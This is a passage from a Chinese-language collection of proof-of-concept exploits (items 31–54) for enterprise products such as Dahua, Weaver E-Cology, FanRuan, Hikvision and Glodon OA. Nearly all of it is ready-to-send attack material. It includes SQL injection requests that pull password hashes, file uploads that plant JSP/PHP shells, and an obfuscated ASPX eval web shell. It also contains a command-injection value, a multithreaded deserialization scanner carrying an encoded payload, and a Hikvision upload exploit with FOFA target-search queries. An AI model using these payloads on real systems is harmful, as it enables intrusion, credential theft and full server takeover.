Cookie: zentaosid=dhjpu2i3g5116j5eba85agl27f; lang=zh-cn; device=desktop; theme=default;tab=qa; windowwidth=1632; windowHeight=783
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

vsoft=kvm&hostType=physical&name=penson&extranet=127.0.0,1%7Ccalc.exe&cpuCores=2&memory=16&diskSize=16&desc=&uid=640be59da4851&type=za
```

## 31.辰信景云终端安全管理系统 login SQL注入漏洞
```
POST /api/user/login

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='
```
## 32.大华车载系统任意文件上传漏洞POC
```
POST /vehicleServer/carDev/icon/import/1?iconType=1 HTTP/1.1 
Host: ip:port
Accept: */*
Accept-Encoding: gzip， deflate， br
Content-Length: 872
Content-Type: multipart/form-data; boundary=----63766573e5aegeegaa8cesaea4 
User-Agent: Mozilla/5.0 (Windows NT 6.2: Win64: X64) Applewebkit/537.36 (KHTML, like Gecko) QtwebEngine/5.9.1 Chrome/56.0.2924.122 Safari/537.36

------63766573e5aegeegaa8cesaea4
Content-Disposition: form-data; name="file"; filename="test.jsp" 
Content-ype: image/png

GIF89a
<%isp 马%> 
------63766573e5ae9ee9aa8ce5aea4
```

获取路径:

```
GET /vehicleServer/carDev/icon/getIconList?nowTime=164605907220
```

## 33.大华智慧园区任意密码读取攻击

```
GET /admin/user_getUserInfoByUserName.action?userName=system
```

## 34.大华智慧园区综合管理平台 searchJson SQL注入漏洞

```
GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```

## 35.大华智慧园区综合管理平台 文件上传漏洞
```
POST /publishing/publishing/material/file/video HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Filedata"; filename="0EaE10E7dF5F10C2.jsp"

<%@page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="poc"

poc
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Submit"

submit
--dd8f988919484abab3816881c55272a7--
```

## 36.帆软channel序列化
```
#!/usr/bin/env python
# -*- conding:utf-8 -*-
# 帆软channel接口反序列化
# Author: SXdysq

import base64
import requests
import urllib3
import concurrent.futures

urllib3.disable_warnings()

headers = {
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
}

def check(host):
    try:
        burp0_url = host + "/webroot/decision/remote/design/channel"
        req = requests.get(burp0_url, headers=headers, verify=False, timeout=3)
        if "method 'GET' not supported" in req.text:
            req = requests.post(burp0_url, headers=headers, verify=False, timeout=3)
            if "如需访问请联系管理员" not in req.text:
                cmd(host)
            else:
                print("[o]", host, "------不存在漏洞！")
        else:
            print("[o]", host, "------不存在漏洞！")
    except Exception as e:
        print("[o]", host, "------不存在漏洞！")

def cmd(host):
    try:
        burp0_url = host + "/webroot/decision/remote/design/channel"
        burp0_headers = {"Content-Type": "application/x-www-form-urlencoded", "Testdmc": "whoami", "Testecho": "TestEcho"}
        b = b"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"
        burp0_data = base64.b64decode(b)
        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False, timeout=3)

        if res.status_code == 200 and 'Testdmc' in res.headers and res.headers['Testdmc']:
            testdmc_value = res.headers['Testdmc']
            print("[+]", host, "------存在漏洞！")
            print("Testdmc的值为：", base64.b64decode(testdmc_value).decode('utf-8'))
        else:
            print("[o]", host, "------不存在漏洞！")
    except Exception as e:
        print("[o]", host, "------不存在漏洞！")

if __name__ == '__main__':
    with open('urls.txt', 'r') as file:
        hosts = [line.strip() for line in file]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(check, hosts)
```
## 37.泛微 E-Cology 某版本 SQL注入漏洞 POC

```
POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 1=1
c0-param1=string:1
batchId=0
```
## 38.泛微 HrmCareerApplyPerView SQL注入漏洞

```
GET
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
Accept-Encoding: gzip, deflate
Connection: close
```
## 39.泛微 ShowDocsImagesql注入漏洞
```
GET
/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection: close
```

## 40.泛微 Weaver E-Office9 前台文件包含
```
http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls
```

## 41.泛微9存在sql注入


**影响版本**

```
(1)/E-mobile/flowdo_page.php?diff=delete&RUN_ID=1  //参数RUN_ID
(2)/E-mobile/flowdo_page.php?diff=delete&flowid=1  //参数flowid
(3)/E-mobile/flowsorce_page.php?flowid=2
(4)/E-mobile/flownext_page.php?diff=candeal&detailid=2
(5)/E-mobile/flowimage_page.php?FLOW_ID=2
(6)/E-mobile/flowform_page.php?FLOW_ID=2
(7)/E-mobile/diaryother_page.php?searchword=23
(8)/E-mobile/create/ajax_do.php?diff=word&sortid=1       //参数sortid
(9)/E-mobile/create/ajax_do.php?diff=word&idstr=2       //参数idstr
(10)/E-mobile/flow/freeflowimg.php?RUN_ID=1             
(11)/E-mobile/create/ajax_do.php?diff=addr&sortid=1     //参数sortid
(12)/E-mobile/create/ajax_do.php?diff=addr&userdept=1  //参数userdept
(13)/E-mobile/create/ajax_do.php?diff=addr&userpriv=1 //参数userpriv
(14)/E-mobile/create/ajax_do.php?diff=wordsearch&idstr=1  //参数idstr
(15)/E-mobile/flow/flowhave_page.php?detailid=2,3
(16)/E-mobile/flow/flowtype_free.php?flowid=1
(17)/E-mobile/flow/flowtype_free.php?runid=1
(18)/E-mobile/flow/flowtype_other.php?flowid=1
(19)/E-mobile/flow/flowtype_other.php?runid=1
(20)/E-mobile/flow/freeflowimage_page.php?fromid=2
(21)/E-mobile/flow/freeflowimage_page.php?diff=new&runid=2  //参数runid

```


## 42.泛微Ecology OA 前台任意SQL语句执行

```
  Condition: body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver"
    &amp;&amp; body="ecology") || (header="ecology_JSessionId" &amp;&amp; body="login/Login.jsp")
    || body="/wui/index.html" || body="jquery_wev8"
```
```
  relative: req0
  session: false
  requests:
  - method: GET
    timeout: 10
    path: /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/62.0.2426.8 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") &amp;&amp; body.regex("[0-9A-F]{32}"))
```

## 43.泛微Ecology未授权
```
POST /OfficeServer HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
Content-Length: 204

------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="aaa"

{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'100'}
------WebKitFormBoundarymVk33liI64J7GQaK—
```

## 44. 泛微E-Office9文件上传漏洞

CVE-2023-2648

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.233.10:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```

**CVE-2023-2523**

```
POST /Emobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1 
Host:192.168.233.10:8082  
Cache-Control:max-age=0  
Upgrade-Insecure-Requests:1  
Origin:null  
Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Accept-Encoding:gzip, deflate
Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection:close

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition:form-data; name="upload_quwan"; filename="1.php."
Content-Type:image/jpeg
<?phpphpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```
## 45.泛微oa代码执行

**描述和影响范围**

Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件/inc/jquery/uploadify/uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。

Weaver E-Office9.0

**POC or EXP**

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.232.137:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
```
## 46.飞企互联 FE 业务协作平台 magePath 参数文件读取漏洞

```
/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
```
## 47.广联达 Linkworks GetIMDictionarySQL 注入漏洞

```
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 
Host: 
Content-Type: application/x-www-form-urlencoded

key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
```
## 48.广联达oa sql注入漏洞

```

POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: xxx.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
```

## 49.广联达oa 后台文件上传漏洞
```

POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 10.10.10.1:8888
X-Requested-With: Ext.basex
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Accept: */*
Origin: http://10.10.10.1
Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40
Cookie: 
Connection: close
Content-Length: 421

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

<%@ Page Language="Jscript" Debug=true%>
<%
var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';
var GFMA=Request.Form("qmq1");
var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
eval(GFMA, ONOQ);
%>

------WebKitFormBoundaryFfJZ4PlAZBixjELj--

```
## 50.海康卫视前台上传
**漏洞描述**
HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视isecure center 综合安防管理平台存在任意文件上传漏洞
**影响版本**

HIKVISION iSecure Center综合安防管理平台,在野。
**fofa查询语句**

icon_hash=“-808437027”
app=“HIKVISION-iSecure-Center”

 **漏洞复现**

EXP/POC：payload.py 脚本 走127.0.0.1:8080 代理，方便burpsuit抓包。

```
#!usr/bin/env python
# *-* coding:utf-8 *-*
import sys
import requests
import string
import random
import urllib3
urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080', 
    'https': 'http://127.0.0.1:8080', #127.0.0.1:8080 代理，方便burpsuit抓包
}

def run(arg):
    try:
        flag=''.join(random.choices(string.ascii_uppercase + string.digits, k = 9))
        filename=''.join(random.choices(string.ascii_uppercase + string.digits, k = 10))
        vuln_url=arg+"center/api/files;.js"
        headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
                 'Accept': '*/*',
                 'Content-Type': 'application/x-www-form-urlencoded'}
        file = {'file': (f'../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{filename}.txt', flag, 'application/octet-stream')}
        r = requests.post(vuln_url, files=file, timeout=15, verify=False, proxies=proxies)
        if r.status_code==200 and "webapps/clusterMgr" in r.text:

            payload=f"clusterMgr/{filename}.txt;.js"
            url=arg+payload
            r2 = requests.get(url, timeout=15, verify=False, proxies=proxies)
            if r2.status_code==200 and flag in r2.text:

                print('\033[1;31;40m')
                print(arg+f":存在海康威视isecure center 综合安防管理平台存在任意文件上传漏洞\nshell地址：{url}")
                print('\033[0m')



        else:
            print(arg+":不存在漏洞")
    except:
        print(arg+":不存在漏洞")


if __name__ == '__main__':
    url=sys.argv[1]
    run(url)
```

**burpsuit抓包分析**

burpsuit 127.0.0.1:8080抓包，抓取post 包一个，get 请求包一个。
payload：请求数据包

```

POST /center/api/files;.js HTTP/1.1
Host: x.x.x.x
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 258
Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4

--e54e7e5834c8c50e92189959fe7227a4
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt"
Content-Type: application/octet-stream

9YPQ3I3ZS
--e54e7e5834c8c50e92189959fe7227a4--
```

**payload的返回数据包。**

```
HTTP/1.1 200 
Server: openresty/1.13.6.2
Date: Fri, 14 Jul 2023 04:35:23 GMT
Content-Type: application/json;charset=UTF-8
Content-Length: 335
Connection: close
Set-Cookie: JSESSIONID=0A235873FB1C02C345345C0D36A4C709; Path=/center; HttpOnly
Content-Language: en_US
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Content-Disposition: inline;filename=f.txt

{"code":"0","data":{"filename":"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/
```

访问漏洞链接：https://x.x.x.x/clusterMgr/2BT5AV96QW.txt;.js ，查看是否上传成功。

因为Hikvision平台使用的中间件为tomcat，修改报文和文件名，所以实现上传哥斯拉生成jsp。
宿主服务器windows和linux都可使用。windows 拿到的账户是system账户，linux为root。
Hikvison账户管理密码的后渗透操作：海康威视综合安防后渗透利用技巧



POC2

```
POST /center/api/files;.html HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%jsp的马%>
------WebKitFormBoundary9PggsiM755PLa54a--
```



 **report 任意文件上传漏洞**

```
POST /svm/api/external/report HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%jsp的马%>

------WebKitFormBoundary9PggsiM755PLa54a--
```

**马儿路径：/portal/ui/login/..;/..;/new.jsp**

##  51.汉得SRM tomcat.jsp 登录绕过漏洞
```

/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```

**然后访问后台：/main.screen**


## 52.红帆 oa 注入


```
POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
Host: 10.250.250.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 383
Content-Type: text/xml; charset=utf-8
Soapaction: "http://tempuri.org/GetFileAtt"
Accept-Encoding: gzip, deflate
Connection: close
<?xml version="1.0" encoding="utf-8"?><soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt
xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt> </soap:Body></so
ap:Envelope>
```

## 53.宏景 HCM codesettree SQL 注入漏洞

```
GET
/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20al
l~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection: close
```
## 54.宏景OA文件上传

```
POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
Host: xx.xx.xx.xx
Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
